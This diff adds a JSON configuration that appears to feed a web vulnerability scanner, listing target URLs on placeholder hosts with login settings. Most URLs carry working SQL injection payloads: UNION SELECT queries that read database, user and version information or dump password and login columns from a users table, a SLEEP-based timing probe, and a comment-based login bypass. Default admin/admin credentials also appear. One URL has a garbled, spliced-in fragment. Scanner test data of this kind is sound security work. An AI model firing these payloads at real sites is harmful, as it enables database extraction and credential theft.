@@ -1,0 +1,128 @@
+[{
+	"https://app1.com/users/login.php":
+	[{
+		"method": "POST",
+		"LoginRequired": "false",
+		"username": "scanner1'#",
+		"password": "",
+		"userID" : "username",
+		"passID" : "password"
+	}],
+	"https://app4.com/admin/project.php?op=edit_component&id=1%27+and+1=2+union+select+1,2,database%28%29,user%28%29,5,6,version%28%29,8,9,10,11,12+--+%20%3E%3E%20app14.com/admiapp14.com/admin/project.php?op=edit_component&id=1%27+and+1=2+union+select+1,2,database%28%29,user%28%29,5,6,version%28%29,8,9,10,11,12+--+" :
+	[{
+		"method": "GET",
+		"LoginRequired" : "false",
+		"username": "",
+		"password": "",
+		"userID": "",
+		"passID": "",
+		"loginButtonID": "",
+		"fieldID": "",
+		"fieldVal": "",
+		"submitID": ""
+	}],
+	"https://app4.com/admin/group.php?op=edit&use_js=1&group_id=1+and+SLEEP%2810%29+--+" :
+	[{
+		"method": "GET",
+		"LoginRequired" : "true",
+		"username": "admin@admin.com",
+		"password": "admin",
+		"userID": "username",
+		"passID": "password",
+		"loginButtonID": "",
+		"fieldID": "",
+		"fieldVal": "",
+		"submitID": ""
+	}],
+	"https://app4.com/admin/status.php?op=edit&status_id=1%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+" :
+	[{
+		"method": "GET",
+		"LoginRequired" : "true",
+		"username": "admin@admin.com",
+		"password": "admin",
+		"userID": "username",
+		"passID": "password",
+		"loginButtonID": "",
+		"fieldID": "",
+		"fieldVal": "",
+		"submitID": ""
+	}],
+	"https://app4.com/admin/resolution.php?op=edit&resolution_id=1%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29+--+" :
+	 [{
+		"method": "GET",
+		"LoginRequired" : "true",
+		"username": "admin@admin.com",
+		"password": "admin",
+		"userID": "username",
+		"passID": "password",
+		"loginButtonID": "",
+		"fieldID": "",
+		"fieldVal": "",
+		"submitID": ""
+	}],
+	"https://app4.com/admin/severity.php?op=edit&severity_id=1%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+" : 
+	[{
+		"method": "GET",
+		"LoginRequired" : "true",
+		"username": "admin@admin.com",
+		"password": "admin",
+		"userID": "username",
+		"passID": "password",
+		"loginButtonID": "",
+		"fieldID": "",
+		"fieldVal": "",
+		"submitID": ""
+	}],
+	"https://app4.com/admin/priority.php?op=edit&priority_id=1%27+and+1=2+union+select+1,user%28%29,database%28%29,4,version%28%29+--+" : 
+	[{
+		"method": "GET",
+		"LoginRequired" : "true",
+		"username": "admin@admin.com",
+		"password": "admin",
+		"userID": "username",
+		"passID": "password",
+		"loginButtonID": "",
+		"fieldID": "",
+		"fieldVal": "",
+		"submitID": ""
+	}],
+	"https://app5.com/www/administrator.php?ctg=messages&folder=1%20UNION%20ALL%20SELECT%201,2,3,password,5,6,login,8,9,10,11,12%20FROM%20users%20--" :
+	[{
+		"method": "GET",
+		"LoginRequired" : "true",
+		"username": "admin",
+		"password": "admin",
+		"userID": "login",
+		"passID": "password",
+		"loginButtonID": "",
+		"fieldID": "",
+		"fieldVal": "",
+		"submitID": ""
+	}],
+	"https://app5.com/www/professor.php?ctg=messages&folder=4%20UNION%20ALL%20SELECT%201,2,3,password,5,6,login,8,9,10,11,12%20FROM%20users%20--" :
+	[{
+		"method": "GET",
+		"LoginRequired" : "true",
+		"username": "professor",
+		"password": "professor",
+		"userID": "login",
+		"passID": "password",
+		"loginButtonID": "",
+		"fieldID": "",
+		"fieldVal": "",
+		"submitID": ""
+	}],
+	"https://app5.com/www/student.php?ctg=messages&folder=7%20UNION%20ALL%20SELECT%201,2,3,password,5,6,login,8,9,10,11,12%20FROM%20users%20--" :
+	[{
+		"method": "GET",
+		"LoginRequired" : "true",
+		"username": "student",
+		"password": "student",
+		"userID": "login",
+		"passID": "password",
+		"loginButtonID": "",
+		"fieldID": "",
+		"fieldVal": "",
+		"submitID": ""
+	}]
+}]
